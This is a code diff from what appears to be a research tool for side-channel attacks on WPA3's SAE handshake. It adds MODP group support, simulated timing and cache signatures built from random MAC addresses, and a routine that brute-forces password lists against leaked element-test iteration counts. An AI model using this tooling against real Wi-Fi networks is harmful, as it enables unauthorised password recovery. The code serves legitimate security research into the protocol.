@@ -2,6 +2,8 @@
 #include <stdio.h>
 #include <string.h>
 
+#include <openssl/rand.h>
+
 #include "sae.h"
 #include "timingresults.h"
 
@@ -21,7 +23,7 @@ private:
 	void simulate_derivation();
 
 public:
-	MacAddrSimulation(PasswordSignature *context, uint8_t *macaddr);
+	MacAddrSimulation(PasswordSignature *context, const uint8_t *macaddr);
 	int get_iterations();
 	int get_hashes_toobig();
 
@@ -35,6 +37,8 @@ class PwFilter
 {
 public:
 	virtual bool is_password_possible() = 0;
+	virtual bool was_used() const = 0;
+	virtual bool is_found() const { return false; };
 };
 
 class PwFilterElementTest : public PwFilter
@@ -43,18 +47,30 @@ private:
 	MacAddrSimulation *macaddr;
 	int iteration;
 	bool found;
+	bool used;
 
 public:
 	PwFilterElementTest(MacAddrSimulation *macaddr, int iteration, bool found)
-		: macaddr(macaddr), iteration(iteration), found(found)
+		: macaddr(macaddr), iteration(iteration), found(found), used(false)
 	{ }
 
 	virtual bool is_password_possible()
 	{
 		// We only expect to use this filter once per MAC address,
 		// so just calculate the result on the spot.
+		used = true;
 		return found == macaddr->found_in_iteration(iteration);
 	}
+
+	virtual bool was_used() const
+	{
+		return used;
+	}
+
+	virtual bool is_found() const
+	{
+		return found;
+	};
 };
 
 class PwFilterVariance : public PwFilter
@@ -62,18 +78,25 @@ class PwFilterVariance : public PwFilter
 private:
 	MacAddrSimulation *macaddr_lower_var;
 	MacAddrSimulation *macaddr_higher_var;
+	bool used;
 
 public:
 	PwFilterVariance(MacAddrSimulation *macaddr_higher, MacAddrSimulation *macaddr_lower)
-		: macaddr_lower_var(macaddr_lower), macaddr_higher_var(macaddr_higher)
+		: macaddr_lower_var(macaddr_lower), macaddr_higher_var(macaddr_higher), used(false)
 	{ }
 
 	virtual bool is_password_possible()
 	{
 		int more_iter = macaddr_lower_var->get_iterations();
 		int less_iter = macaddr_higher_var->get_iterations();
+		used = true;
 
 		return more_iter > less_iter;
+	}
+
+	virtual bool was_used() const
+	{
+		return used;
 	}
 };
 
@@ -93,6 +116,7 @@ private:
 	double pr_toobig;
 	double *factors;
 	int group;
+	bool used;
 
 	// TODO: Use integers instead of double for higher performance
 	double simulate_time_impl(MacAddrSimulation *addr, int impl)
@@ -109,7 +133,7 @@ private:
 
 public:
 	PwFilterAverage(MacAddrSimulation *macaddr_slower, MacAddrSimulation *macaddr_faster, int group)
-		: macaddr_faster(macaddr_faster), macaddr_slower(macaddr_slower), group(group)
+		: macaddr_faster(macaddr_faster), macaddr_slower(macaddr_slower), group(group), used(false)
 	{
 		switch (group) {
 		case 28:
@@ -139,6 +163,8 @@ public:
 	 */
 	virtual bool is_password_possible()
 	{
+		used = true;
+
 		for (int i = 0; i < 3; ++i)
 		{
 			double time_faster = simulate_time_impl(macaddr_faster, i);
@@ -154,6 +180,11 @@ public:
 		// then we filter it away.
 		return false;
 	}
+
+	virtual bool was_used() const
+	{
+		return used;
+	}
 };
 
 // Ratio on work laptop, personal laptop, and raspberry pi
@@ -161,6 +192,10 @@ double PwFilterAverage::factors28[] = { 17.41, 16.74, 23.21 };
 double PwFilterAverage::factors29[] = { 16.17, 15.84, 25.23 };
 double PwFilterAverage::factors30[] = { 14.33, 18.99, 46.33 };
 
+void rand_bytes(unsigned char *buffer, size_t len)
+{
+	RAND_bytes(buffer, len);
+}
 
 void MacAddrSimulation::simulate_derivation()
 {
@@ -170,11 +205,13 @@ void MacAddrSimulation::simulate_derivation()
 	this->num_iterations = sae_num_elemtests_ecc(context->ec, context->bssid,
 				this->macaddr, (const uint8_t*)context->password, strlen(context->password),
 				context->pwd_seed, &this->num_hashes_toobig);
+	context->num_simulated_elemtests += this->num_iterations;
+	context->num_simulated_elemtests_hashtoobig += this->num_hashes_toobig;
 
 	simulated_pwid = context->password_id;
 }
 
-MacAddrSimulation::MacAddrSimulation(PasswordSignature *context, uint8_t *macaddr)
+MacAddrSimulation::MacAddrSimulation(PasswordSignature *context, const uint8_t *macaddr)
 {
 	this->context = context;
 	memcpy(this->macaddr, macaddr, 6);
@@ -197,9 +234,38 @@ int MacAddrSimulation::get_hashes_toobig()
 
 bool MacAddrSimulation::found_in_iteration(int iteration)
 {
-	return 1 == sae_num_elemtests_ecc_iteration(context->ec, context->bssid,
+	int rval = context->sae_num_elemtests_any_iteration(context->bssid,
 				this->macaddr, (const uint8_t*)context->password, strlen(context->password),
 				context->pwd_seed, iteration);
+	context->num_simulated_elemtests++;
+	if (rval == -1)
+		context->num_simulated_elemtests_hashtoobig++;
+	// FIXME: Replace with rval >= 0 to test Brainpool cache attack
+	return rval == 1;
+}
+
+bool PasswordSignature::init_group(int groupid)
+{
+	this->group = groupid;
+
+	if (this->group >= 22 && this->group <= 24)
+	{
+		this->dh = get_dh_group(this->group);
+		if (this->dh == NULL) {
+			fprintf(stderr, "Failed to initialize MODP group %d\n", this->group);
+			return false;
+		}
+	}
+	else
+	{
+		this->ec = ec_group_init(this->group);
+		if (this->ec == NULL) {
+			fprintf(stderr, "Failed to initialize ECC group %d\n", this->group);
+			return false;
+		}
+	}
+
+	return true;
 }
 
 bool PasswordSignature::parse_macaddr(const char *charaddr, uint8_t *macaddr)
@@ -214,15 +280,8 @@ bool PasswordSignature::parse_macaddr(const char *charaddr, uint8_t *macaddr)
 	return rval == 6;
 }
 
-MacAddrSimulation * PasswordSignature::lookup_macaddr(const char *charaddr)
+MacAddrSimulation * PasswordSignature::lookup_macaddr(const uint8_t *macaddr)
 {
-	if (charaddr == NULL)
-		return NULL;
-
-	uint8_t macaddr[6];
-	if (!parse_macaddr(charaddr, macaddr))
-		return NULL;
-
 	std::string straddr((const char *)macaddr, 6);
 	auto it = macaddr_map.find(straddr);
 	if (it != macaddr_map.end()) {
@@ -232,6 +291,18 @@ MacAddrSimulation * PasswordSignature::lookup_macaddr(const char *charaddr)
 		macaddr_map[straddr] = addrSimul;
 		return addrSimul;
 	}
+}
+
+MacAddrSimulation * PasswordSignature::lookup_macaddr_str(const char *charaddr)
+{
+	if (charaddr == NULL)
+		return NULL;
+
+	uint8_t macaddr[6];
+	if (!parse_macaddr(charaddr, macaddr))
+		return NULL;
+
+	return lookup_macaddr(macaddr);
 }
 
 int PasswordSignature::read_password_signature(const char *filename)
@@ -264,13 +335,9 @@ int PasswordSignature::read_password_signature(const char *filename)
 		}
 		else if (strcmp(filter, "Group") == 0)
 		{
-			// TODO: Also support MODP groups!!
-			this->group = atoi(optarg1);
-			this->ec = ec_group_init(this->group);
-			if (this->ec == NULL) {
-				fprintf(stderr, "Failed to initialize group in line: %s\n", line);
+			int group = atoi(optarg1);
+			if (!init_group(group))
 				goto fail;
-			}
 		}
 		// Note: in the future we can add filters where we take into account an
 		// estimate of which iteration they were found in, or a min/max on the
@@ -278,8 +345,8 @@ int PasswordSignature::read_password_signature(const char *filename)
 		// in an exact iteration.
 		else if (strcmp(filter, "HigherVariance") == 0)
 		{
-			MacAddrSimulation *addr1 = lookup_macaddr(optarg1);
-			MacAddrSimulation *addr2 = lookup_macaddr(optarg2);
+			MacAddrSimulation *addr1 = lookup_macaddr_str(optarg1);
+			MacAddrSimulation *addr2 = lookup_macaddr_str(optarg2);
 
 			if (addr1 == NULL || addr2 == NULL) {
 				fprintf(stderr, "Couldn't parse MAC addresses in line: %s\n", line);
@@ -291,8 +358,8 @@ int PasswordSignature::read_password_signature(const char *filename)
 		}
 		else if (strcmp(filter, "HigherAverage") == 0)
 		{
-			MacAddrSimulation *addr1 = lookup_macaddr(optarg1);
-			MacAddrSimulation *addr2 = lookup_macaddr(optarg2);
+			MacAddrSimulation *addr1 = lookup_macaddr_str(optarg1);
+			MacAddrSimulation *addr2 = lookup_macaddr_str(optarg2);
 
 			if (addr1 == NULL || addr2 == NULL) {
 				fprintf(stderr, "Couldn't parse MAC addresses in line: %s\n", line);
@@ -304,7 +371,7 @@ int PasswordSignature::read_password_signature(const char *filename)
 		}
 		else if (strcmp(filter, "ElementTest") == 0)
 		{
-			MacAddrSimulation *addr = lookup_macaddr(optarg1);
+			MacAddrSimulation *addr = lookup_macaddr_str(optarg1);
 			int iteration = atoi(optarg2);
 			int found = atoi(optarg3) != 0;
 
@@ -335,6 +402,76 @@ PasswordSignature::PasswordSignature(const char *filename)
 		throw std::runtime_error("Could not open signature file");
 }
 
+PasswordSignature::PasswordSignature(int num_elemtests, int groupid)
+{
+	simulate_signatures(num_elemtests, groupid);
+}
+
+int PasswordSignature::sae_num_elemtests_any_iteration(const uint8_t *addr1,
+			   const uint8_t *addr2, const uint8_t *password,
+			   size_t password_len, uint8_t pwd_seed[SHA256_DIGEST_LENGTH],
+			   int iteration)
+{
+	if (this->group >= 22 && this->group <= 24)
+		return sae_num_elemtests_ffc_iteration(this->dh, addr1, addr2,
+				password, password_len, iteration);
+	else
+		return sae_num_elemtests_ecc_iteration(this->ec, addr1, addr2, password,
+				password_len, pwd_seed, iteration);
+}
+
+
+void PasswordSignature::sort_signatures()
+{
+	PwFilter* sorted_filters[MAX_FILTERS];
+
+	int index_front = 0;
+	int index_back = num_filters - 1;
+	for (int i = 0; i < num_filters; ++i)
+	{
+		if (!filters[i]->is_found())
+			sorted_filters[index_front++] = filters[i];
+		else
+			sorted_filters[index_back--] = filters[i];
+	}
+
+	memcpy(filters, sorted_filters, sizeof(filters));
+}
+
+
+void PasswordSignature::simulate_signatures(int num_elemtests, int groupid)
+{
+	// TODO: Support MODP as well
+	uint8_t pwd_seed[SHA256_DIGEST_LENGTH];
+	int total_iterations = 0;
+	uint8_t bssid[6];
+	const char *testpw = "testpw";
+
+	// Generate random AP address
+	rand_bytes(this->bssid, 6);
+	init_group(groupid);
+
+	for (int i = 0; i < num_elemtests; ++i)
+	{
+		// Generate random client MAC address
+		unsigned char macaddr[6];
+		rand_bytes(macaddr, 6);
+
+		// Check whether the first iteration finds the group element or not
+		int rval = sae_num_elemtests_any_iteration(this->bssid, macaddr, (uint8_t*)testpw,
+							   strlen(testpw), pwd_seed, 1);
+		bool found = rval == 1;
+
+		MacAddrSimulation *addr = lookup_macaddr(macaddr);
+		int iteration = 1;
+
+		filters[num_filters] = new PwFilterElementTest(addr, iteration, found);
+		num_filters++;
+	}
+
+	sort_signatures();
+}
+
 bool PasswordSignature::check_password(const char *password)
 {
 	// All filters will automatically access this password. By increasing
@@ -358,28 +495,33 @@ int PasswordSignature::bruteforce(PasswordList *passwords)
 	const char *pw = passwords->next();
 	int num_checked = 0;
 
-	printf("Bruteforcing %d passwords using group %d\n", passwords->size(), group);
+	//printf("Bruteforcing %d passwords using group %d\n", passwords->size(), group);
 
 	while (pw != NULL)
 	{
-		if (num_checked % 20000 == 0)
-			printf("Checking for password %d: %s\n", num_checked + 1, pw);
+		//if (num_checked % 20000 == 0)
+		//	printf("Checking for password %d: %s\n", num_checked + 1, pw);
 
-		if (check_password(pw)) {
-			// For debugging... TODO: Remove me
-			printf("FOUND: %s\n", pw);
-			static int first = 1;
-			if (!first)
-				exit(1);
-			first = 0;
-
+		if (check_password(pw))
 			num_possible++;
-		}
 
 		num_checked++;
 		pw = passwords->next();
 	}
 
 	return num_possible;
+}
+
+int PasswordSignature::num_used_elemtests() const
+{
+	int num_used = 0;
+
+	for (int i = 0; i < num_filters; ++i)
+	{
+		if (filters[i]->was_used())
+			num_used++;
+	}
+
+	return num_used;
 }
 
